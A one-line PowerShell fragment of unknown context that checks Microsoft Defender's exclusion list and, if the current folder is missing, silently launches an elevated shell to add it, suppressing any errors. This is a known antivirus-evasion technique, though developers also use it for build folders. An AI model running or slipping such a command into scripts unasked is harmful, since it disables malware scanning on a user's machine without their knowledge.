...
try{if((Get-MpPreference).ExclusionPath -notcontains (Convert-Path .)){Start-Process pwsh -Verb runAs -ArgumentList "Add-MpPreference -ExclusionPath '$(Convert-Path .)'"}}catch{}
